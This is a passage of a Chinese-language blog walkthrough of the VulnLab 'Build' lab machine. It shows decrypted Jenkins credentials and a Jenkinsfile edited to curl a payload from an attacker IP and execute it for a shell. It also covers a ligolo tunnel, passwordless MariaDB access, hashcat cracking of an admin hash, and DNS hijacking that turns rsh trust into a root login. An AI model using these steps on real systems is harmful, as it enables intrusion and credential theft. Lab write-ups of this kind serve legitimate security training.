+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241231041623-auult6g.png" alt="image">​</p>
+<p>既然得到了這兩個文件，所以就可以嘗試解密：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 ~/Build/pwn_jenkins/offline_decryption/jenkins_offline_decrypt.py secrets/master.key secrets/hudson.util.Secret <span class="built_in">jobs</span>/build/config.xml</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229081246-9mvedri.png" alt="image">​</p>
+<p>然後就得到了密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Git1234!</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>試了下得到的密碼沒辦法登錄 ssh ，所以換個地方入手。</p>
+<p>‍</p>
+<p>在3000端口中還存在一個 gitea： </p>
+<p>‍</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241228231920-12trs7s.png" alt="image">​</p>
+<p>點擊 explore ：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241228231928-ma8ercv.png" alt="image">​</p>
+<p>看到一個用戶名是 <code>buildadm</code>​，而且有一個項目是 <code>dev</code>​，點開來后看到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241228231941-1ax0zro.png" alt="image">​</p>
+<p>可以看到上面有一個綠色的√，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229081928-5iqi4xi.png" alt="image">​</p>
+<p>鼠標移過去會有這些提示，這個是 <code>Jenkins</code>​的構建項目脚本，類似於 <code>runner</code>​。如果修改這個文件，就會出發這裏面的内容，文件的内容如下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241228231950-kvqts7m.png" alt="image">​</p>
+<p>如果可以修改這裏面的内容執行任意命令，那就可以獲得一個 shell，剛好從備份文件中得到一個密碼，所以嘗試使用 <code>buildadm</code>​ 的用戶去登錄：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229081347-wqp0ctz.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buildadm : Git1234!</span><br></pre></td></tr></table></figure>
+
+<p>結果成功的來到了後臺：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229081317-z4vari0.png" alt="image">​</p>
+<p>這樣就可以嘗試修改那個文件來得到一個shell：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229082702-3i15435.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">    agent any</span><br><span class="line"></span><br><span class="line">    stages &#123;</span><br><span class="line">        stage(<span class="string">&#x27;Do nothing&#x27;</span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                sh <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">                    curl 10.8.4.212/mane -o /tmp/mane</span></span><br><span class="line"><span class="string">                    chmod 777 /tmp/mane</span></span><br><span class="line"><span class="string">                    /tmp/mane</span></span><br><span class="line"><span class="string">                &#x27;</span><span class="string">&#x27;&#x27;</span> </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>等待一段時間后，成功的運行了命令，然後得到了shell：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229082816-1f9hrlv.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229082845-yzyowyu.png" alt="image">​</p>
+<p>在用戶的目錄中發現 <code>.rhosts</code>​，裏面有兩行内容：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230004923-z9yve9n.png" alt="image">​</p>
+<p>只有這兩個域名可以免密碼的使用 rsh 來登錄當前用戶，既然是這樣，那就需要修改 dns 才會工作。</p>
+<p>跑了一下 linpeas：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229233410-ay50vpf.png" alt="image">​</p>
+<p>發現當前在 <code>172.18.0.3</code>​ 這個網段裏面，所以快速使用 rustscan 掃描一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rustscan -a 172.18.0.0/24 -g -p 7,21,22,23,25,465,587,43,49,53,69,79,80,443,88,110,995,111,113,123,135,593,137,138,139,139,445,143,993,161,162,10161,10162,194,6667,6660,7000,2641,389,636,3268,3269,500,502,512,513,514,515,548,554,8554,623,631,700,873,1026,1080,1098,1099,1050,1414,1433,1521,1522,1529,1723,1883,2049,2301,2381,2375,2376,3128,3260,3299,3306,3389,3632,3690,3702,4369,4786,4840,5000,5353,5432,5433,5439,5555,5601,5671,5672,5800,5801,5900,5901,5984,6984,5985,5986,5985,5986,6011,6379,8009,8086,8089,8333,18333,38333,18444,9000,9001,9042,9160,9100,9200,10000,11211,15672,24007,24008,24009,49152,27017,27018,44134,44818,47808,50030,50060,50070,50075,50090 </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229234022-xwp3o4s.png" alt="image">​</p>
+<p>看到了一堆ip，如果要訪問的話就需要設置tunnel，爲了圖個方便這裏使用 <code>ligolo</code>​ 。</p>
+<h2 id="Setting-up-ligolo-tunnel"><a href="#Setting-up-ligolo-tunnel" class="headerlink" title="Setting up ligolo tunnel"></a>Setting up ligolo tunnel</h2><p>關於ligolo的用法可以參考網上的内容，這裏就快速的把 ligolo 的tunnel 弄好：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@5ac6c7d6fb8e:/tmp<span class="comment"># ./agent  -connect 10.8.4.212:6666 -ignore-cert -retry</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229234325-okfgz1t.png" alt="image">​</p>
+<p>連接端如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Agent : root@5ac6c7d6fb8e] » ifdel --name pickeddoppelgan            </span><br><span class="line">[Agent : root@5ac6c7d6fb8e] » ifcreate --name manesec                </span><br><span class="line">[Agent : root@5ac6c7d6fb8e] » route_add --name manesec --route 172.18.0.0/24                       </span><br><span class="line">[Agent : root@5ac6c7d6fb8e] » start --tun manesec</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003220-29ffqnw.png" alt="image">​</p>
+<p>建立好tunnel之後ping一下，如果通了就説明 tunnel 沒問題。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003255-2kitr1q.png" alt="image">​</p>
+<h2 id="Accessing-SQL-without-password"><a href="#Accessing-SQL-without-password" class="headerlink" title="Accessing SQL without password"></a>Accessing SQL without password</h2><p>嘗試訪問 <code>172.18.0.6</code>​，果然有一個地方可以修改dns：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241229234436-3kweuva.png" alt="image">​</p>
+<p>但是現在也沒有賬號密碼，在 rustscan 的結果中看到了 3306 是開著的，嘗試用免密碼的方式登錄：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root -h 172.18.0.4 --skip_ssl</span><br><span class="line">Warning: World-writable config file <span class="string">&#x27;/etc/my.cnf&#x27;</span> is ignored</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection <span class="built_in">id</span> is 55</span><br><span class="line">Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; </span><br></pre></td></tr></table></figure>
+
+<p>結果成功了，看了一下數據庫：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003621-pjq69yz.png" alt="image">​</p>
+<p>果然這是 <code>powerdnsadmin</code>​ 的數據庫，看了一下有什麽表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; use powerdnsadmin</span><br><span class="line">MariaDB [powerdnsadmin]&gt; show tables</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003634-1iufstp.png" alt="image">​</p>
+<p>其中有一個 user 表，查詢一下數據看看裏面有什麽：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * from user</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003701-bxjy78s.png" alt="image">​</p>
+<h2 id="Crack-the-password-and-login-Power-DNS-Admin"><a href="#Crack-the-password-and-login-Power-DNS-Admin" class="headerlink" title="Crack the password and login Power DNS Admin"></a>Crack the password and login Power DNS Admin</h2><p>結果是admin的賬號和hash，這時候有兩個辦法，第一個是修改裏面的密碼，第二個是破解hash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2b$12<span class="variable">$s1hK0o7YNkJGfu5poWx</span>.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq</span><br></pre></td></tr></table></figure>
+
+<p>所以嘗試破解看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat.exe hash.txt rockyou.txt -m 3200</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003859-nsvz3j4.png" alt="image">​</p>
+<p>得到密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2b$12<span class="variable">$s1hK0o7YNkJGfu5poWx</span>.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq:winston</span><br></pre></td></tr></table></figure>
+
+<p>嘗試登陸一下後臺頁面：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003920-1dp0zee.png" alt="image">​</p>
+<h2 id="Change-DNS-for-attack-IP-and-login-with-RSH"><a href="#Change-DNS-for-attack-IP-and-login-with-RSH" class="headerlink" title="Change DNS for attack IP and login with RSH"></a>Change DNS for attack IP and login with RSH</h2><p>進去了之後，就可以修改 <code>build.vl</code>​ 這個域名的dns：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003932-w4dcmqc.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230003943-6f9c9h1.png" alt="image">​</p>
+<p>上面提到容器裏面的 <code>.rhosts</code>​説明 <code>admin.build.vl</code>​ 和 <code>intern.build.vl</code>​ 這兩個是可以免密碼登錄 rsh 的：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230004025-2xq0j23.png" alt="image">​</p>
+<p>參考：<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-rsh">https://book.hacktricks.xyz/network-services-pentesting/pentesting-rsh</a></p>
+<p>所以把<code>admin.build.vl</code>​ 和 <code>intern.build.vl</code>​ 修改成自己的 ip，你也可以像我這樣暴力的修改：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230005039-n3fr21i.png" alt="image">​</p>
+<p>修改完成后，使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rsh root@build.vl</span><br></pre></td></tr></table></figure>
+
+<p>就可以免密碼登入 root 了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/02-vulnlab-Build/image-20241230005142-k6dgn82.png" alt="image">​</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&text=VulnLab - Machine - Build"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&title=VulnLab - Machine - Build"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&is_video=false&description=VulnLab - Machine - Build"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Build&body=Check out this article: https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&title=VulnLab - Machine - Build"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&title=VulnLab - Machine - Build"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&title=VulnLab - Machine - Build"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&title=VulnLab - Machine - Build"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&name=VulnLab - Machine - Build&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/01/2025/02-vulnlab-build/&t=VulnLab - Machine - Build"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
